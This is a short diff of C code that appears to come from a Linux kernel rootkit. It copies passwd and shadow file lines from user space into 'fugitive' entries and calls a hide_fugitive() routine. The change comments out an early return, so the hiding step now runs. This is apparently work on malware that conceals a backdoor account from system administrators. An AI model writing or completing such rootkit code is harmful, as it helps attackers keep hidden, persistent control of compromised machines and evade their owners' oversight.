@@ -54,9 +54,9 @@ printk("strncpy_from_user(_shadow, shadow, LINE_MAX) -> %d\n", retval);
     kfree(_shadow);
     return retval;
   }
-kfree(_passwd);//////////////////////////////////
-kfree(_shadow);////////////////////////////////
-return 0;//////////////////////////////////
+//kfree(_passwd);//////////////////////////////////
+//kfree(_shadow);////////////////////////////////
+//return 0;//////////////////////////////////
   fugitive__lines[0] = _passwd;
   fugitive__lines[1] = _shadow;
   retval = hide_fugitive();
